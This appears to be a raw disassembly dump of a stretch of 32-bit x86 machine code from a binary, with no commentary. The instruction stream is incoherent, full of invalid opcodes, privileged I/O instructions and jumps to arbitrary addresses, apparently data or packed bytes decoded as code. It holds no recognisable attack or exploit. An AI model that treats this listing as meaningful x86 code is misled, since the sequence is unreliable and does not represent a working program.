  41b27f:	imul   ecx,DWORD PTR [ebp+0x15],0x78
  41b283:	arpl   dx,dx
  41b285:	ins    DWORD PTR es:[edi],dx
  41b286:	dec    ebx
  41b287:	jnp    0x41b2ce
  41b289:	(bad)  
  41b28a:	arpl   WORD PTR [eax-0x63],sp
  41b28d:	mov    bl,0x68
  41b28f:	jmp    0x523b1999
  41b294:	outs   dx,BYTE PTR ds:[esi]
  41b295:	push   edx
  41b296:	mov    eax,edi
  41b298:	fwait
  41b299:	pop    edx
  41b29a:	pop    eax
  41b29b:	iret   
  41b29c:	sbb    esp,DWORD PTR [ebp+0x23fa69bd]
  41b2a2:	sbb    eax,0xf417152f
  41b2a7:	ja     0x41b2a2
  41b2a9:	ret    0x5808
  41b2ac:	scas   eax,DWORD PTR es:[edi]
  41b2ad:	dec    edi
  41b2ae:	xchg   DWORD PTR [ecx+0x20],esi
  41b2b1:	sub    edx,ebx
  41b2b3:	xor    al,0x2b
  41b2b5:	icebp  
  41b2b6:	xor    DWORD PTR [ebp-0x6c],esi
  41b2b9:	sub    eax,0xfc0abdac
  41b2be:	mov    WORD PTR [esi-0x4],?
  41b2c1:	mov    edx,0x483697d9
  41b2c6:	mov    bh,0xdc
  41b2c8:	std    
  41b2c9:	call   0x1b325557
  41b2ce:	and    al,0xd9
  41b2d0:	jge    0x41b31f
  41b2d2:	xchg   ecx,eax
  41b2d3:	aad    0x6b
  41b2d5:	test   DWORD PTR [edx],eax
  41b2d7:	pop    ebp
  41b2d8:	mov    ah,ch
  41b2da:	jp     0x41b2db
  41b2dc:	dec    ebp
  41b2dd:	lods   eax,DWORD PTR ds:[esi]
  41b2de:	cwde   
  41b2df:	clc    
  41b2e0:	mov    ebx,0x1fa658b4
  41b2e5:	sbb    esi,ebp
  41b2e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b2e8:	sbb    eax,0x176c110c
  41b2ed:	add    eax,0xe16ad5f3
  41b2f2:	and    DWORD PTR [eax],eax
  41b2f4:	jo     0x41b306
  41b2f6:	dec    eax
  41b2f7:	jb     0x41b2f7
  41b2f9:	stc    
  41b2fa:	out    0xd5,eax
  41b2fc:	cmp    eax,0xb50f9e35
  41b301:	repnz in ax,dx
  41b304:	sti    
  41b305:	inc    esp
  41b306:	cmp    esi,DWORD PTR [esi+0x74]
  41b309:	fs icebp 
  41b30b:	mov    ah,0x36
  41b30d:	pop    esp
  41b30e:	rol    ebx,0x66
  41b311:	pop    esi
  41b312:	and    ch,BYTE PTR [edi+ebx*2]
  41b315:	dec    BYTE PTR [edx]
  41b317:	mov    eax,ds:0x84dd4df2
  41b31c:	mov    eax,DWORD PTR fs:[eax-0x7ea9ed99]
  41b323:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b324:	into   
  41b325:	jae    0x41b37f
  41b327:	push   edx
  41b328:	adc    DWORD PTR [esi+0x6603efaf],esi
  41b32e:	(bad)  
  41b32f:	int3   
  41b330:	lock loopne 0x41b381
  41b333:	pushf  
  41b334:	arpl   WORD PTR [ecx+0x1b],si
  41b337:	pop    esp
  41b338:	inc    ebx
  41b339:	icebp  
  41b33a:	push   ds
  41b33b:	xor    ah,BYTE PTR [edx-0x5242a28f]
  41b341:	fidivr DWORD PTR [edi-0x32]
  41b344:	in     eax,dx
  41b345:	cmp    ebx,ecx
  41b347:	cmp    al,0x64
  41b349:	xor    BYTE PTR [esi+0x6277978c],0x56
  41b350:	push   edx
  41b351:	(bad)  
  41b352:	and    al,0x2f
  41b354:	int    0x8a
  41b356:	les    ecx,FWORD PTR ds:0xc850ab5
  41b35c:	mov    eax,ds:0x54780bde
  41b361:	(bad)  [ecx+eiz*4+0x78616edd]
  41b368:	push   es
  41b369:	call   0x5436:0x3713ff13
  41b370:	inc    esi
  41b371:	mov    bh,0xca
  41b373:	lea    ecx,[esi]
  41b375:	sahf   
  41b376:	inc    ecx
  41b377:	sbb    eax,0xcfac0c1e
  41b37c:	mov    BYTE PTR [ecx+0x54],al
  41b37f:	das    
  41b380:	into   
  41b381:	(bad)  
  41b382:	cmp    dh,BYTE PTR [esi-0x576379a4]
  41b388:	dec    edx
  41b389:	xchg   edx,eax
  41b38a:	mov    edi,0x74c61a85
  41b38f:	dec    ebx
  41b390:	imul   ecx,DWORD PTR [ecx+ebx*8],0x97dc0057
  41b397:	jbe    0x41b3e0
  41b399:	pusha  
  41b39a:	repnz pop ebp
  41b39c:	cmp    bh,BYTE PTR ds:0x47ca8d8d
  41b3a2:	les    ebx,FWORD PTR [eax]
  41b3a4:	add    al,BYTE PTR [ecx+0x34]
  41b3a7:	scas   al,BYTE PTR es:[edi]
  41b3a8:	jecxz  0x41b3bf
  41b3aa:	push   edx
  41b3ab:	in     eax,dx
  41b3ac:	in     eax,0x27
  41b3ae:	icebp  
  41b3af:	jge    0x41b3b1
  41b3b1:	adc    al,0xee
  41b3b3:	inc    esi
  41b3b4:	inc    esp
  41b3b5:	xor    al,0x18
  41b3b7:	adc    ebp,edx
  41b3b9:	int    0xfb
  41b3bb:	inc    eax
  41b3bc:	mov    DWORD PTR ss:[esi+0x6dc29e09],esp
  41b3c3:	popf   
  41b3c4:	iret   
  41b3c5:	stos   BYTE PTR es:[edi],al
  41b3c6:	dec    ebp
  41b3c7:	mov    ebp,0xe139acb3
  41b3cc:	fcmove st,st(7)
  41b3ce:	nop
  41b3cf:	inc    ebx
  41b3d0:	mov    dl,0x73
  41b3d2:	in     eax,dx
  41b3d3:	jecxz  0x41b420
  41b3d5:	jo     0x41b3bb
  41b3d7:	mov    ecx,DWORD PTR [esi-0x5ca2af30]
  41b3dd:	adc    eax,0xbf7877c0
  41b3e2:	xchg   edx,esp
  41b3e4:	inc    ebx
  41b3e5:	lea    eax,[edx-0x5b3cc3fd]
  41b3eb:	mov    BYTE PTR [esi],bl
  41b3ed:	or     ecx,DWORD PTR [esi+0x2bac6544]
  41b3f3:	or     cl,BYTE PTR [ecx-0x27]
  41b3f6:	ret    0x5379
  41b3f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b3fa:	lods   al,BYTE PTR ds:[esi]
  41b3fb:	mov    edi,DWORD PTR [eax-0x67775db7]
  41b401:	pop    ss
  41b402:	stc    
  41b403:	adc    eax,0xa3ad243f
  41b408:	ja     0x41b3c4
  41b40a:	mov    dh,0x78
  41b40c:	stos   DWORD PTR es:[edi],eax
  41b40d:	sub    al,0x51
  41b40f:	jo     0x41b3c2
  41b411:	loopne 0x41b429
  41b413:	push   eax
  41b414:	test   DWORD PTR [edi-0x75],ecx
  41b417:	dec    eax
  41b418:	pop    edi
  41b419:	push   esp
  41b41a:	mov    al,0x47
  41b41c:	pop    ss
  41b41d:	mov    dl,0xf8
  41b41f:	fs aaa 
  41b421:	int    0x64
  41b423:	in     eax,dx
  41b424:	sar    BYTE PTR [ecx],0x58
  41b427:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b429:	xchg   ecx,eax
  41b42a:	xchg   edi,eax
  41b42b:	adc    BYTE PTR [ecx-0x7b],ch
  41b42e:	in     al,dx
  41b42f:	int    0x3d
  41b431:	aad    0x37
  41b433:	or     BYTE PTR [edi-0x593083fa],dh
  41b439:	jnp    0x41b3f8
  41b43b:	enter  0x2ee4,0x94
  41b43f:	jp     0x41b457
  41b441:	push   0xaa37d4de
  41b446:	lods   al,BYTE PTR ds:[esi]
  41b447:	icebp  
  41b448:	dec    esp
  41b449:	xor    eax,0xa2c8a1c1
  41b44e:	icebp  
  41b44f:	cmp    DWORD PTR [edi],ebx
  41b451:	call   0xfec66af7
  41b456:	mov    edi,0x904b569
  41b45b:	imul   edx,DWORD PTR [ebx+0x6e2cbbd8],0xffffffef
  41b462:	lds    edx,FWORD PTR [ebx+0x5e]
  41b465:	xor    bl,dh
  41b467:	imul   edx,esi,0x51
  41b46a:	ins    DWORD PTR es:[edi],dx
  41b46b:	cmp    esi,DWORD PTR [ecx-0x59]
  41b46e:	jo     0x41b3f3
  41b470:	push   esi
  41b471:	push   ecx
  41b472:	or     BYTE PTR [esi],dh
  41b474:	imul   DWORD PTR [eax-0x531b3510]
  41b47a:	div    BYTE PTR [ecx+0x44c39ab2]
  41b480:	push   cs
  41b481:	ret    
  41b482:	test   al,0xa7
  41b484:	je     0x41b460
  41b486:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b487:	pop    ecx
  41b488:	pop    es
  41b489:	or     BYTE PTR [edx],ch
  41b48b:	cli    
  41b48c:	cmovne edx,DWORD PTR [edx-0x268b2f11]
  41b493:	adc    al,0xc1
  41b495:	add    al,0x28
  41b497:	inc    edi
  41b498:	sub    DWORD PTR ds:0x6303584d,ebx
  41b49e:	popa   
  41b49f:	push   es
  41b4a0:	call   0x21dd:0xbf46bf58
  41b4a7:	sbb    DWORD PTR [eax+0x6a],ebx
  41b4aa:	sbb    DWORD PTR [eax-0x4],edi
  41b4ad:	mov    ebx,0xcb8275d5
  41b4b2:	fbstp  TBYTE PTR ds:0xf95be19e
  41b4b8:	les    ecx,FWORD PTR [eax+ebx*2-0x6d85d8d8]
  41b4bf:	je     0x41b4dc
  41b4c1:	jg     0x41b50a
  41b4c3:	dec    edx
  41b4c4:	mov    cl,0xd3
  41b4c6:	sub    edx,DWORD PTR [edx+0x36]
  41b4c9:	out    dx,eax
  41b4ca:	xchg   edx,eax
  41b4cb:	xor    edx,DWORD PTR [edx-0x3d]
  41b4ce:	add    eax,ebx
  41b4d0:	adc    eax,0xafd0438e
  41b4d5:	int3   
  41b4d6:	dec    edx
  41b4d7:	call   0x1e82ad67
  41b4dc:	std    
  41b4dd:	xor    edi,esp
  41b4df:	repz xor ebx,0xffffffcd
  41b4e3:	pop    esi
  41b4e4:	loope  0x41b4e6
  41b4e6:	fiadd  DWORD PTR [eax]
  41b4e8:	mov    bl,0x60
  41b4ea:	cld    
  41b4eb:	or     BYTE PTR ds:0xf6e924e3,al
  41b4f1:	xor    DWORD PTR [ecx+0x5c620b64],ebp
  41b4f7:	ret    
  41b4f8:	xor    BYTE PTR [esi],ch
  41b4fa:	pop    esp
  41b4fb:	jb     0x41b4ae
  41b4fd:	frstor [edx-0x45]
  41b500:	sbb    ebp,DWORD PTR [eax+ecx*8+0x5c]
  41b504:	mov    eax,ds:0xb4725ec4
  41b509:	mov    ds:0x27114e1a,al
  41b50e:	aas    
  41b50f:	jbe    0x41b510
  41b511:	mov    ds:0x2a409f4d,al
  41b516:	pop    esi
  41b517:	mov    cl,0x7f
  41b519:	adc    al,0x23
  41b51b:	loop   0x41b597
  41b51d:	aaa    
  41b51e:	test   eax,0xbdad0ab8
  41b523:	pushf  
  41b524:	loope  0x41b571
  41b526:	jg     0x41b586
  41b528:	or     DWORD PTR es:[esi],0x7c
  41b52c:	mov    ecx,0xda374661
  41b531:	ret    
  41b532:	clc    
  41b533:	int    0xba
  41b535:	add    bl,0x6e
  41b538:	(bad)  
  41b53a:	cmp    ebx,eax
  41b53c:	add    BYTE PTR es:[esi],0x14
  41b540:	test   al,0xb5
  41b542:	adc    al,0x32
  41b544:	push   ebx
  41b545:	jne    0x41b5ab
  41b547:	retf   0x8908
  41b54a:	xchg   DWORD PTR [ecx],eax
  41b54c:	call   0x8829f73b
  41b551:	mov    WORD PTR [ebx],?
  41b553:	gs adc ch,cl
  41b556:	outs   dx,BYTE PTR ds:[esi]
  41b557:	lea    ebx,[edx]
  41b559:	divps  xmm6,XMMWORD PTR [ebp-0x6ec644dc]
  41b560:	jmp    0x774de4ac
  41b565:	add    DWORD PTR [esi+edi*1-0x4f],esp
  41b569:	scas   al,BYTE PTR es:[edi]
  41b56a:	and    DWORD PTR [esi],ebx
  41b56c:	sub    BYTE PTR [eax-0x751e5a42],cl
  41b572:	xor    BYTE PTR [eax],dh
  41b574:	push   cs
  41b575:	mov    ah,dh
  41b577:	ins    BYTE PTR es:[edi],dx
  41b578:	lea    esp,[edx]
  41b57a:	jmp    0x44931dba
  41b57f:	leave  
  41b580:	enter  0x29bf,0x9f
  41b584:	mov    WORD PTR [ecx],es
  41b586:	mov    ebx,ds
  41b588:	or     eax,0x70bb4795
  41b58d:	sub    eax,0x5aefbbd6
  41b592:	dec    edi
  41b593:	pop    esp
  41b594:	pushf  
  41b595:	jbe    0x41b56b
  41b597:	fsubr  st,st(2)
  41b599:	cmp    DWORD PTR [edi+ecx*1+0x325e1c47],0x793b5572
  41b5a4:	neg    bh
  41b5a6:	mov    ebp,0x7804d877
  41b5ab:	mov    ebp,0x6cb512ef
  41b5b0:	nop
  41b5b1:	dec    edi
  41b5b2:	mov    edi,DWORD PTR [ebx-0x20f1f36a]
  41b5b8:	xchg   ebp,eax
  41b5b9:	cvtdq2ps xmm3,xmm3
  41b5bc:	and    DWORD PTR [edi],edx
  41b5be:	dec    ebx
  41b5bf:	call   0x2e614f8e
  41b5c4:	dec    ebx
  41b5c5:	aaa    
  41b5c6:	shl    DWORD PTR [ebp+0x3e],cl
  41b5c9:	in     eax,0xe0
  41b5cb:	cmp    dl,BYTE PTR [esi+edi*4+0x32f20abb]
  41b5d2:	jmp    0xb060479b
  41b5d7:	cs es push cs
  41b5da:	adc    al,0x80
  41b5dc:	sub    DWORD PTR [ecx+0x6a4c25a0],0x9c2ca2ae
  41b5e6:	dec    ecx
  41b5e7:	icebp  
  41b5e8:	jno    0x41b5d7
  41b5ea:	and    dh,BYTE PTR [ebx+0x64]
  41b5ed:	add    ebp,edx
  41b5ef:	addr16 test al,0xf3
  41b5f2:	add    ch,BYTE PTR [edx+0x14c3b8e0]
  41b5f8:	xor    ebp,esi
  41b5fa:	or     BYTE PTR [ebx-0x6f],al
  41b5fd:	xchg   ebx,eax
  41b5fe:	sbb    DWORD PTR [edx],ebx
  41b600:	out    0x64,eax
  41b602:	dec    ecx
  41b603:	(bad)  
  41b604:	cdq    
  41b605:	inc    esp
  41b606:	jmp    0x67fd9051
  41b60b:	ret    0xbf40
  41b60e:	push   ebx
  41b60f:	(bad)  
  41b610:	shl    BYTE PTR ds:0xe8c3b9c2,cl
  41b616:	data16 aam 0x23
  41b619:	dec    eax
  41b61a:	sti    
  41b61b:	in     al,dx
  41b61c:	imul   ecx,DWORD PTR [eax-0x23a7bd81],0xa555afa3
  41b626:	inc    esp
  41b627:	cs fsubp st(2),st
  41b62a:	jle    0x41b674
  41b62c:	cwde   
  41b62d:	out    dx,al
  41b62e:	bound  edi,QWORD PTR [eiz*8-0x682447f2]
  41b635:	mov    bh,0xbd
  41b637:	in     eax,dx
  41b638:	push   eax
  41b639:	sti    
  41b63a:	bound  ecx,QWORD PTR [ebx]
  41b63c:	mov    dh,0x5f
  41b63e:	and    esp,0xffffff83
  41b641:	xchg   DWORD PTR [eax-0x20b1f70e],ebx
  41b647:	jmp    0xe404855e
  41b64c:	push   DWORD PTR [edx-0x32d6b519]
  41b652:	pusha  
  41b653:	mov    esp,0x495a1bf9
  41b658:	mov    WORD PTR [edx],?
  41b65a:	jb     0x41b5fc
  41b65c:	jbe    0x41b637
  41b65e:	hlt    
  41b65f:	sub    eax,0x6f4bf4df
  41b664:	outs   dx,DWORD PTR ds:[esi]
  41b665:	dec    esi
  41b666:	in     al,0xed
  41b668:	repz out dx,eax
  41b66a:	jns    0x41b6c6
  41b66c:	fdivr  DWORD PTR [edi-0x8]
  41b66f:	mov    gs,edi
  41b671:	and    eax,0xc4757e37
  41b676:	pop    es
  41b677:	test   BYTE PTR [edi+ebp*4],dl
  41b67a:	push   es
  41b67b:	bound  ebp,QWORD PTR [esi+ebp*2+0x4d3b67d9]
  41b682:	imul   esi
  41b684:	sub    al,0x85
  41b686:	fistp  DWORD PTR [esi]
  41b688:	sbb    BYTE PTR ds:0x20222f8e,bh
  41b68e:	sbb    DWORD PTR [edx+0xf44c860],edi
  41b694:	not    DWORD PTR [ecx-0x4e]
  41b697:	into   
  41b698:	sub    eax,DWORD PTR [ecx+0x39]
  41b69b:	pop    esi
  41b69c:	cs ins BYTE PTR es:[edi],dx
  41b69e:	lahf   
  41b69f:	out    0xa0,eax
  41b6a1:	(bad)  
  41b6a3:	jno    0x41b6ac
  41b6a5:	lahf   
  41b6a6:	adc    BYTE PTR [esi-0x4861e54b],dh
  41b6ac:	cmp    eax,0xd6f6e173
  41b6b1:	stos   BYTE PTR es:[edi],al
  41b6b2:	icebp  
  41b6b3:	imul   ecx,esi,0x5d7a0b36
  41b6b9:	or     BYTE PTR [edx+0x10],0x85
  41b6bd:	dec    eax
  41b6be:	in     al,dx
  41b6bf:	pop    esi
  41b6c0:	adc    eax,0x8e5244b0
  41b6c5:	fild   DWORD PTR [ebx-0x529a8d1f]
  41b6cb:	push   edx
  41b6cc:	xor    BYTE PTR [ecx],dl
  41b6ce:	inc    esp
  41b6cf:	push   edi
  41b6d0:	sub    al,0xf3
  41b6d2:	sbb    eax,0xd17d3fc9
  41b6d7:	int    0x47
  41b6d9:	pop    edx
  41b6da:	jbe    0x41b6ac
  41b6dc:	in     eax,dx
  41b6dd:	dec    ebp
  41b6de:	addr16 or cl,ch
  41b6e1:	mov    cl,0x0
  41b6e3:	xchg   edx,eax
  41b6e4:	arpl   WORD PTR [edi+0x44940dd4],dx
  41b6ea:	jno    0x41b6a1
  41b6ec:	add    ebp,ebp
  41b6ee:	xchg   esp,eax
  41b6ef:	fsubr  DWORD PTR ds:0x49557c0f
  41b6f5:	test   bh,ch
  41b6f7:	fwait
  41b6f8:	icebp  
  41b6f9:	mov    DWORD PTR [esi],eax
  41b6fb:	aaa    
  41b6fc:	mov    al,ds:0x4b4971f4
  41b701:	cmc    
  41b702:	pushf  
  41b703:	adc    eax,0x8794e86d
  41b708:	xor    DWORD PTR ds:0x8dda316b,0xfffffff1
  41b70f:	sbb    eax,0x441ae65d
  41b714:	push   ds
  41b715:	jl     0x41b757
  41b717:	xchg   esi,eax
  41b718:	mov    bl,0x25
  41b71a:	cs into 
  41b71c:	cmp    DWORD PTR [ebp-0x19bc3f4a],esp
  41b722:	loopne 0x41b78e
  41b724:	mov    ebx,esp
  41b726:	xor    al,0x8b
  41b728:	ins    BYTE PTR es:[edi],dx
  41b729:	adc    DWORD PTR [edx+0x7e496377],ecx
  41b72f:	lods   al,BYTE PTR ds:[esi]
  41b730:	out    0xf1,eax
  41b732:	add    ah,BYTE PTR [esi-0x3]
  41b735:	xchg   ebp,eax
  41b736:	addr16 adc al,0x3
  41b739:	movzx  eax,BYTE PTR [edi+0x35ec261b]
  41b740:	adc    eax,0x53e29eb
  41b745:	idiv   DWORD PTR [edx]
  41b747:	setno  ah
  41b74a:	ss or  eax,0x564720ab
  41b750:	loopne 0x41b706
  41b752:	xor    BYTE PTR [ebx],ch
  41b754:	les    esi,FWORD PTR [eax]
  41b756:	(bad)  
  41b757:	and    ebx,edi
  41b759:	pop    eax
  41b75a:	out    0x59,eax
  41b75c:	or     BYTE PTR [eax+0x65],0x46
  41b760:	mov    DWORD PTR ds:0xf8b5816f,edi
  41b766:	mov    bl,0x7a
  41b768:	dec    edi
  41b769:	mov    esp,DWORD PTR [edi-0x6aabfa44]
  41b76f:	add    eax,0xd86bdc39
  41b774:	mov    al,0xd7
  41b776:	mov    ds:0xa34054b6,al
  41b77b:	stc    
  41b77c:	and    bl,cl
  41b77e:	jmp    0xe6aa:0x5e843047
  41b785:	cs fcomip st,st(7)
  41b788:	jae    0x41b7b6
  41b78a:	pusha  
  41b78b:	ss sub eax,0x37348537
  41b791:	out    0xc7,al
  41b793:	test   DWORD PTR [eax+0x1f],esi
  41b796:	pusha  
  41b797:	inc    ebx
  41b798:	loop   0x41b7b8
  41b79a:	retw   
  41b79c:	push   eax
  41b79d:	jo     0x41b7dd
  41b79f:	pop    edx
  41b7a0:	dec    ebx
  41b7a1:	add    BYTE PTR ds:0x3e3a8bf,dl
  41b7a7:	les    esi,FWORD PTR [ecx-0x665606ac]
  41b7ad:	out    0x0,al
  41b7af:	rol    DWORD PTR [esi+0x14],0xb4
  41b7b3:	push   ecx
  41b7b4:	mov    edx,0xe7c25bc0
  41b7b9:	inc    edx
  41b7ba:	pop    esp
  41b7bb:	xor    al,BYTE PTR [edx+0xa]
  41b7be:	retf   
  41b7bf:	xchg   edx,eax
  41b7c0:	lahf   
  41b7c1:	adc    DWORD PTR [edi],edx
  41b7c3:	dec    ecx
  41b7c4:	mov    ds:0xabb0f71,al
  41b7c9:	add    DWORD PTR [esi-0x76],eax
  41b7cc:	dec    esi
  41b7cd:	add    edi,DWORD PTR [esi+0x5d92cbe1]
  41b7d3:	or     eax,0x1db3a230
  41b7d8:	sbb    BYTE PTR [esi],bl
  41b7da:	inc    esi
  41b7db:	test   DWORD PTR cs:[ebx],edi
  41b7de:	cmp    al,0x46
  41b7e0:	loopne 0x41b7f5
  41b7e2:	out    0x21,al
  41b7e4:	js     0x41b83a
  41b7e6:	fnstenv [esi-0x6c]
  41b7e9:	pop    ebx
  41b7ea:	stc    
  41b7eb:	cmp    ch,BYTE PTR [esi-0x3ce0f68b]
  41b7f1:	jbe    0x41b7f8
  41b7f3:	jnp    0x41b82c
  41b7f5:	pop    esi
  41b7f6:	cmc    
  41b7f7:	xor    DWORD PTR [ebp+0x7f96e50b],0xffffffd7
  41b7fe:	xor    DWORD PTR [esi-0x2713ad6e],ebx
  41b804:	aaa    
  41b805:	inc    edi
  41b806:	adc    BYTE PTR [ebp+0x2f],0xd5
  41b80a:	add    al,0x60
  41b80c:	scas   al,BYTE PTR es:[edi]
  41b80d:	mov    esp,0xf812bee
  41b812:	fstp   TBYTE PTR [ebp-0x5e]
  41b815:	stos   BYTE PTR es:[edi],al
  41b816:	cmp    dh,BYTE PTR [ecx]
  41b818:	inc    esp
  41b819:	inc    ecx
  41b81a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b81b:	and    ch,BYTE PTR [edx]
  41b81d:	inc    eax
  41b81e:	and    cx,0xdd69
  41b823:	or     eax,0x36e56375
  41b828:	xor    edi,DWORD PTR [edi+0x33]
  41b82b:	mov    dh,0x66
  41b82d:	lods   al,BYTE PTR ds:[esi]
  41b82e:	mov    DWORD PTR [edi],ebp
  41b830:	add    ebx,DWORD PTR [edx]
  41b832:	mov    edi,0x24b6016f
  41b837:	repnz sub al,0x71
  41b83a:	cli    
  41b83b:	cmp    ebx,DWORD PTR [eax]
  41b83d:	mov    ecx,0x693ef39
  41b842:	push   ebx
  41b843:	outs   dx,BYTE PTR cs:[esi]
  41b845:	xor    ebx,DWORD PTR [eax-0x57]
  41b848:	cmp    cl,BYTE PTR [ebx+0x72beca11]
  41b84e:	add    BYTE PTR [ebp+0x9],bl
  41b851:	arpl   WORD PTR [edx+0x2],si
  41b854:	jmp    0x2f45d07a
  41b859:	fst    DWORD PTR [ebx]
  41b85b:	adc    DWORD PTR [ecx],0xffffff94
  41b85e:	pop    ebp
  41b85f:	mov    ecx,0x207b9d40
  41b864:	retf   0xc9b8
  41b867:	sbb    al,0x6d
  41b869:	xchg   edi,eax
  41b86a:	lock test eax,0x216f9921
  41b870:	add    ebp,eax
  41b872:	lea    ebp,[eax+ebx*1+0x2845714]
  41b879:	mov    ebp,0x7482340f
  41b87e:	jb     0x41b806
  41b880:	pop    eax
  41b881:	pop    ss
  41b882:	ja     0x41b86b
  41b884:	adc    al,0x62
  41b887:	jbe    0x41b8dc
  41b889:	mov    bh,0xd2
  41b88b:	fidiv  DWORD PTR [ebp+0x79]
  41b88e:	mov    ebp,0x6805e7fe
  41b893:	cmp    edi,ebp
  41b895:	pop    esi
  41b896:	lock cmc 
  41b898:	shl    ch,1
  41b89a:	mov    ecx,0x2efd9d9
  41b89f:	jnp    0x41b8f8
  41b8a1:	sub    eax,DWORD PTR [edi+0x62]
  41b8a4:	xchg   edi,eax
  41b8a5:	mov    dh,0xf9
  41b8a7:	ins    DWORD PTR es:[edi],dx
  41b8a8:	(bad)  
  41b8a9:	std    
  41b8aa:	cmp    DWORD PTR [edi],ecx
  41b8ac:	xor    esi,DWORD PTR [edx+ebp*1]
  41b8af:	add    al,0xe4
  41b8b1:	jg     0x41b925
  41b8b3:	(bad)  
  41b8b4:	shl    BYTE PTR [ebx-0x3a2dbac7],1
  41b8ba:	les    ebx,FWORD PTR [edx+0x21]
  41b8bd:	lahf   
  41b8be:	inc    esi
  41b8bf:	cdq    
  41b8c0:	pop    ecx
  41b8c1:	sub    eax,0x39ee61de
  41b8c6:	and    al,0xf6
  41b8c8:	inc    edx
  41b8c9:	jge    0x41b920
  41b8cb:	daa    
  41b8cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b8cd:	mov    dl,BYTE PTR [eax+ebp*8]
  41b8d0:	mov    dh,0x8c
  41b8d2:	cld    
  41b8d3:	out    0xcc,eax
  41b8d5:	lods   eax,DWORD PTR ds:[esi]
  41b8d6:	and    al,0x13
  41b8d8:	scas   al,BYTE PTR es:[edi]
  41b8d9:	sub    cl,bl
  41b8db:	adc    cl,BYTE PTR [eax+0x24bf48a5]
  41b8e1:	ret    
  41b8e2:	or     eax,0x9c453464
  41b8e7:	in     al,0x31
  41b8e9:	inc    edx
  41b8ea:	sub    eax,0x1c896d2c
  41b8ef:	loopne 0x41b882
  41b8f1:	ja     0x41b8a7
  41b8f3:	fdivr  st,st(0)
  41b8f5:	ins    DWORD PTR es:[edi],dx
  41b8f6:	lahf   
  41b8f7:	daa    
  41b8f8:	push   ecx
  41b8f9:	and    cl,BYTE PTR [eax-0x44a9ae13]
  41b8ff:	xor    eax,0x97973b08
  41b904:	xchg   BYTE PTR [ebx-0x34],bl
  41b907:	cwde   
  41b908:	in     eax,0x11
  41b90a:	push   cs
  41b90b:	jge    0x41b91f
  41b90d:	das    
  41b90e:	dec    esp
  41b90f:	leave  
  41b910:	jge    0x41b8c2
  41b912:	bound  ebx,QWORD PTR [eax]
  41b914:	fild   WORD PTR ds:0xe2d74e6
  41b91a:	mov    fs,WORD PTR [ebx-0x4a]
  41b91d:	dec    esp
  41b91e:	add    esp,DWORD PTR [edi+0x16cc4f66]
  41b924:	arpl   WORD PTR [ebx+ecx*2],dx
  41b927:	jl     0x41b93a
  41b929:	jl     0x41b908
  41b92b:	outs   dx,BYTE PTR ds:[esi]
  41b92c:	dec    ecx
  41b92d:	push   ebx
  41b92e:	bound  ebx,QWORD PTR [ebx-0x5b56c2a8]
  41b934:	pop    ecx
  41b935:	imul   DWORD PTR [ebx+esi*2-0xeed2ba4]
  41b93c:	cs loopne 0x41b921
  41b93f:	cmp    al,0xf0
  41b941:	dec    esp
  41b942:	in     eax,dx
  41b943:	scas   al,BYTE PTR es:[edi]
  41b944:	out    0x86,eax
  41b946:	pusha  
  41b947:	xor    DWORD PTR [ebx],ecx
  41b949:	leave  
  41b94a:	xor    eax,0xd031e879
  41b94f:	iret   
  41b950:	inc    ebx
  41b951:	(bad)  
  41b952:	sbb    ebx,esi
  41b954:	es jl  0x41b969
  41b957:	pop    ds
  41b958:	push   0x58
  41b95a:	pusha  
  41b95b:	ja     0x41b9db
  41b95d:	xor    eax,0xa69a52ac
  41b962:	dec    ebx
  41b963:	mov    esi,0x476f554f
  41b968:	(bad)  
  41b969:	xor    bl,BYTE PTR [esi]
  41b96b:	call   0x88e3ce85
  41b970:	aad    0x2
  41b972:	pop    es
  41b973:	(bad)  
  41b974:	jg     0x41b9e5
  41b976:	pop    esp
  41b977:	add    eax,0xdda3e462
  41b97c:	mov    dh,0x99
  41b97e:	jbe    0x41b94c
  41b980:	and    edx,esp
  41b982:	dec    eax
  41b983:	dec    esi
  41b984:	(bad)  
  41b985:	dec    edx
  41b986:	shr    BYTE PTR [edi-0x36],0xe
  41b98a:	sub    al,0xeb
  41b98c:	hlt    
  41b98d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b98e:	clc    
  41b98f:	mov    eax,0x92dc10c7
  41b994:	inc    ecx
  41b995:	push   ss
  41b996:	(bad)  
  41b997:	cmc    
  41b998:	mov    edi,fs
  41b99a:	dec    ebp
  41b99b:	mov    cs,WORD PTR [ecx+0x4]
  41b99e:	add    esp,DWORD PTR [edi]
  41b9a0:	jmp    0x51d37c1c
  41b9a5:	or     DWORD PTR [ecx-0x12eb5fdf],esi
  41b9ab:	mov    esi,0x67294bca
  41b9b0:	rcl    DWORD PTR [esi+0x4542be4c],1
  41b9b6:	xor    DWORD PTR [edi-0x5160ac6e],eax
  41b9bc:	push   esi
  41b9bd:	push   cs
  41b9be:	ret    0x212e
  41b9c1:	push   edi
  41b9c2:	mov    ch,0xf
  41b9c4:	ret    
  41b9c5:	jo     0x41b9d0
  41b9c7:	ds xchg ecx,eax
  41b9c9:	dec    edx
  41b9ca:	loope  0x41b98b
  41b9cc:	pop    ds
  41b9cd:	cli    
  41b9ce:	mov    ebp,0x23a484d
  41b9d3:	inc    edi
  41b9d4:	mov    ebx,0xc0a99c82
  41b9d9:	xchg   ecx,eax
  41b9da:	mov    cl,0x86
  41b9dc:	add    al,0x87
  41b9de:	pop    edi
  41b9df:	sbb    BYTE PTR ds:0x30f8f8c5,al
  41b9e5:	iret   
  41b9e6:	call   0x2120:0xbe436617
  41b9ed:	jne    0x41b981
  41b9ef:	mov    dl,BYTE PTR [esi]
  41b9f1:	scas   al,BYTE PTR es:[edi]
  41b9f2:	ins    DWORD PTR es:[edi],dx
  41b9f3:	iret   
  41b9f4:	mov    BYTE PTR [eax+ebx*1-0x2a],ah
  41b9f8:	daa    
  41b9f9:	ja     0x41b9a2
  41b9fb:	(bad)  
  41b9fc:	fmul   QWORD PTR [edi+0x3fbbfd94]
  41ba02:	outs   dx,DWORD PTR ds:[esi]
  41ba03:	adc    esp,eax
  41ba05:	sti    
  41ba06:	xchg   ebp,eax
  41ba07:	mov    bh,0x1d
  41ba09:	push   cs
